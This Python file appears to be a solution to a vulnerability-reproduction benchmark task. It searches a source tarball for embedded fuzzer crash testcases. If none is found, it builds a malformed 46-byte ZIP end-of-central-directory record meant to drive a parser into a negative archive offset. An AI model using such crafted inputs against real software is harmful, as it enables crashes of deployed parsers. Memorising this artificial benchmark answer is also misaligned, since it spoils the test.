import io
import os
import re
import struct
import tarfile
from typing import Optional, Tuple, List


class Solution:
    def _is_probably_text(self, data: bytes) -> bool:
        if not data:
            return True
        if b"\x00" in data:
            return False
        sample = data[:4096]
        printable = 0
        for b in sample:
            if b in (9, 10, 13) or 32 <= b <= 126:
                printable += 1
        return printable / max(1, len(sample)) >= 0.95

    def _zip_negative_archive_offset_poc(self) -> bytes:
        # EOCD at offset 0 with non-zero central directory size => archive start offset becomes negative.
        # Total length: 22 + 24 = 46
        eocd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,  # signature "PK\x05\x06"
            0,  # disk number
            0,  # disk with central directory
            1,  # entries on this disk
            1,  # total entries
            1,  # central directory size
            0,  # central directory offset
            24,  # comment length
        )
        return eocd + (b"A" * 24)

    def _find_embedded_poc(self, tf: tarfile.TarFile) -> Optional[bytes]:
        bad_ext = {
            ".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh", ".inl",
            ".py", ".md", ".rst", ".txt", ".json", ".toml", ".yml", ".yaml",
            ".cmake", ".mk", ".make", ".am", ".ac", ".m4", ".sh", ".bat", ".ps1",
            ".html", ".css", ".js", ".ts", ".java", ".go", ".rs", ".swift",
            ".patch", ".diff", ".csv", ".xml",
        }

        strong_name_keys = (
            "clusterfuzz-testcase-minimized",
            "clusterfuzz",
            "testcase",
            "crash",
            "repro",
            "poc",
            "ossfuzz",
            "oss-fuzz",
        )
        dir_keys = ("corpus", "seed", "testdata", "test-data", "poc", "pocs", "repro", "crash")

        candidates: List[Tuple[int, int, str, bytes]] = []

        for m in tf:
            if not m.isfile():
                continue
            if m.size <= 0 or m.size > 1_000_000:
                continue

            name = m.name
            lname = name.lower()
            base = os.path.basename(lname)
            _, ext = os.path.splitext(base)

            name_has_strong = any(k in lname for k in strong_name_keys)
            name_in_dirs = any(f"/{k}/" in lname or lname.startswith(f"{k}/") for k in dir_keys)

            if not (name_has_strong or name_in_dirs or (m.size <= 8192 and ext in (".bin", ".dat", ".zip", ".7z", ".rar", ".cab", ".arj", ".z", ".gz", ".bz2", ".xz"))):
                continue

            f = tf.extractfile(m)
            if f is None:
                continue
            try:
                data = f.read()
            finally:
                f.close()

            if not data:
                continue

            likely_text = self._is_probably_text(data)
            if likely_text and not name_has_strong:
                continue
            if ext in bad_ext and not name_has_strong:
                continue

            score = 0
            if name_has_strong:
                score += 200
            if "clusterfuzz-testcase-minimized" in lname:
                score += 500
            if name_in_dirs:
                score += 80
            if ext in (".zip", ".7z", ".rar", ".cab", ".bin", ".dat"):
                score += 40
            if len(data) == 46:
                score += 150
            # prefer small
            score -= min(len(data), 65536) // 16

            candidates.append((score, len(data), name, data))

        if not candidates:
            return None
        candidates.sort(key=lambda x: (-x[0], x[1], x[2]))
        return candidates[0][3]

    def _source_mentions_zip_eocd(self, tf: tarfile.TarFile) -> bool:
        patterns = (
            "0x06054b50",
            "06054b50",
            "pk\\x05\\x06",
            "pk\\005\\006",
            "end of central directory",
            "eocd",
            "central directory",
            "archive_start_offset",
            "archive start offset",
        )
        text_ext = {".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh", ".inl"}
        checked = 0
        for m in tf:
            if not m.isfile() or m.size <= 0 or m.size > 400_000:
                continue
            name = m.name.lower()
            _, ext = os.path.splitext(name)
            if ext not in text_ext:
                continue
            f = tf.extractfile(m)
            if f is None:
                continue
            try:
                data = f.read(200_000)
            finally:
                f.close()
            try:
                txt = data.decode("utf-8", "ignore").lower()
            except Exception:
                continue
            if any(p in txt for p in patterns):
                return True
            checked += 1
            if checked >= 400:
                break
        return False

    def solve(self, src_path: str) -> bytes:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                poc = self._find_embedded_poc(tf)
                if poc is not None and len(poc) > 0:
                    return poc
        except Exception:
            pass

        try:
            with tarfile.open(src_path, "r:*") as tf2:
                if self._source_mentions_zip_eocd(tf2):
                    return self._zip_negative_archive_offset_poc()
        except Exception:
            pass

        return self._zip_negative_archive_offset_poc()